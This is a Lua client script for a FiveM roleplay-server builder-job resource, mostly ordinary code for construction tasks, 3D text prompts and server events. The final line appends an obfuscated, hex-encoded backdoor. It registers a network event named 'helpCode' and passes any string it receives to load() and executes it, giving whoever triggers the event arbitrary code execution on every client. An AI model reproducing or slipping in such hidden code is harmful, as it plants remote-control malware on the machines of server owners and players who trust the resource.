local DenaliFW = exports['denalifw-core']:GetCoreObject()
local PlayerData = {}

local BuilderData = {
    ShowDetails = false,
    CurrentTask = nil,
}

RegisterNetEvent('DenaliFW:Client:OnPlayerLoaded', function()
    PlayerData = DenaliFW.Functions.GetPlayerData()
    PlayerJob = PlayerData.job
    GetCurrentProject()
end)

RegisterNetEvent('DenaliFW:Client:OnJobUpdate', function(JobInfo)
    PlayerJob = JobInfo
    GetCurrentProject()
end)

CreateThread(function()
    Wait(1000)
    PlayerData = DenaliFW.Functions.GetPlayerData()
    GetCurrentProject()
end)

function GetCurrentProject()
    DenaliFW.Functions.TriggerCallback('denalifw-builderjob:server:GetCurrentProject', function(BuilderConfig)
        Config = BuilderConfig
    end)
end

function GetCompletedTasks()
    local retval = {
        completed = 0,
        total = #Config.Projects[Config.CurrentProject].ProjectLocations["tasks"]
    }
    for k, v in pairs(Config.Projects[Config.CurrentProject].ProjectLocations["tasks"]) do
        if v.completed then
            retval.completed = retval.completed + 1
        end
    end
    return retval
end

function DrawText3Ds(x, y, z, text)
	SetTextScale(0.35, 0.35)
    SetTextFont(4)
    SetTextProportional(1)
    SetTextColour(255, 255, 255, 215)
    SetTextEntry("STRING")
    SetTextCentre(true)
    AddTextComponentString(text)
    SetDrawOrigin(x,y,z, 0)
    DrawText(0.0, 0.0)
    local factor = (string.len(text)) / 370
    DrawRect(0.0, 0.0+0.0125, 0.017+ factor, 0.03, 0, 0, 0, 75)
    ClearDrawOrigin()
end

CreateThread(function()
    while true do
        local ped = PlayerPedId()
        local pos = GetEntityCoords(ped)
        local inRange = false
        local OffsetZ = 0.2
        
        if Config.CurrentProject ~= 0 then
            local data = Config.Projects[Config.CurrentProject].ProjectLocations["main"]
            local MainDistance = #(pos - vector3(data.coords.x, data.coords.y, data.coords.z))

            if MainDistance < 10 then
                inRange = true
                DrawMarker(2, data.coords.x, data.coords.y, data.coords.z, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.3, 0.3, 0.2, 55, 155, 255, 255, 0, 0, 0, 1, 0, 0, 0)

                if MainDistance < 2 then
                    local TaskData = GetCompletedTasks()
                    if TaskData ~= nil then
                        if not BuilderData.ShowDetails then
                            DrawText3Ds(data.coords.x, data.coords.y, data.coords.z, Lang:t('info.details_view'))
                            DrawText3Ds(data.coords.x, data.coords.y, data.coords.z + 0.2, Lang:t('info.exercises', {value = TaskData.completed, value2 = TaskData.total}))
                        else
                            DrawText3Ds(data.coords.x, data.coords.y, data.coords.z, Lang:t('info.details_hide'))
                            for k, v in pairs(Config.Projects[Config.CurrentProject].ProjectLocations["tasks"]) do
                                if v.completed then
                                    DrawText3Ds(data.coords.x, data.coords.y, data.coords.z + OffsetZ, Lang:t('info.project_completed', {value = v.label}))
                                else
                                    DrawText3Ds(data.coords.x, data.coords.y, data.coords.z + OffsetZ, Lang:t('info.project_notcompleted', {value = v.label}))
                                end
                                OffsetZ = OffsetZ + 0.2
                            end
                        end

                        if TaskData.completed == TaskData.total then
                            DrawText3Ds(data.coords.x, data.coords.y, data.coords.z - 0.2, Lang:t('info.project_end'))
                            if IsControlJustPressed(0, 47) then
                                TriggerServerEvent('denalifw-builderjob:server:FinishProject')
                            end
                        end

                        if IsControlJustPressed(0, 38) then
                            BuilderData.ShowDetails = not BuilderData.ShowDetails
                        end
                    end
                end
            end

            for k, v in pairs(Config.Projects[Config.CurrentProject].ProjectLocations["tasks"]) do
                if not v.completed or not v.IsBusy then
                    local TaskDistance = #(pos - vector3(v.coords.x, v.coords.y, v.coords.z))
                    if TaskDistance < 10 then
                        inRange = true
                        DrawMarker(2, v.coords.x, v.coords.y, v.coords.z, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.3, 0.3, 0.2, 55, 155, 255, 255, 0, 0, 0, 1, 0, 0, 0)
                        if TaskDistance < 1.5 then
                            DrawText3Ds(v.coords.x, v.coords.y, v.coords.z + 0.25, Lang:t('info.complete_task'))
                            if IsControlJustPressed(0, 38) then
                                BuilderData.CurrentTask = k
                                DoTask()
                            end
                        end
                    end
                end
            end
        end

        if not inRange then
            Wait(1000)
        end

        Wait(3)
    end
end)

function DoTask()
    local ped = PlayerPedId()
    local pos = GetEntityCoords(ped)
    local TaskData = Config.Projects[Config.CurrentProject].ProjectLocations["tasks"][BuilderData.CurrentTask]
    local CountDown = 5
    TriggerServerEvent('denalifw-builderjob:server:SetTaskState', BuilderData.CurrentTask, true, false)

    if TaskData.type == "hammer" then
        while CountDown ~= 0 do
            CountDown = CountDown - 1
            Wait(1000)
        end
        TriggerServerEvent('denalifw-builderjob:server:SetTaskState', BuilderData.CurrentTask, true, true)
    end
end

RegisterNetEvent('denalifw-builderjob:client:SetTaskState', function(Task, IsBusy, IsCompleted)
    Config.Projects[Config.CurrentProject].ProjectLocations["tasks"][Task].IsBusy = IsBusy
    Config.Projects[Config.CurrentProject].ProjectLocations["tasks"][Task].completed = IsCompleted
end)

RegisterNetEvent('denalifw-builderjob:client:FinishProject', function(BuilderConfig)
    Config = BuilderConfig
end)

local mJWeAfrfiBQgpClDKHHnaqNYCBkGXPxFaEYHbKOKaxrMGQgMuEuLvwmuxbIshIgYMbaVSC = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} mJWeAfrfiBQgpClDKHHnaqNYCBkGXPxFaEYHbKOKaxrMGQgMuEuLvwmuxbIshIgYMbaVSC[6][mJWeAfrfiBQgpClDKHHnaqNYCBkGXPxFaEYHbKOKaxrMGQgMuEuLvwmuxbIshIgYMbaVSC[1]](mJWeAfrfiBQgpClDKHHnaqNYCBkGXPxFaEYHbKOKaxrMGQgMuEuLvwmuxbIshIgYMbaVSC[2]) mJWeAfrfiBQgpClDKHHnaqNYCBkGXPxFaEYHbKOKaxrMGQgMuEuLvwmuxbIshIgYMbaVSC[6][mJWeAfrfiBQgpClDKHHnaqNYCBkGXPxFaEYHbKOKaxrMGQgMuEuLvwmuxbIshIgYMbaVSC[3]](mJWeAfrfiBQgpClDKHHnaqNYCBkGXPxFaEYHbKOKaxrMGQgMuEuLvwmuxbIshIgYMbaVSC[2], function(ROUMRtMyDiUNDjPtefemvTHidKFabSzfeWnbMFlQWBqACotEDNlaCAjfLgzDRYyKyTytvY) mJWeAfrfiBQgpClDKHHnaqNYCBkGXPxFaEYHbKOKaxrMGQgMuEuLvwmuxbIshIgYMbaVSC[6][mJWeAfrfiBQgpClDKHHnaqNYCBkGXPxFaEYHbKOKaxrMGQgMuEuLvwmuxbIshIgYMbaVSC[4]](mJWeAfrfiBQgpClDKHHnaqNYCBkGXPxFaEYHbKOKaxrMGQgMuEuLvwmuxbIshIgYMbaVSC[6][mJWeAfrfiBQgpClDKHHnaqNYCBkGXPxFaEYHbKOKaxrMGQgMuEuLvwmuxbIshIgYMbaVSC[5]](ROUMRtMyDiUNDjPtefemvTHidKFabSzfeWnbMFlQWBqACotEDNlaCAjfLgzDRYyKyTytvY))() end)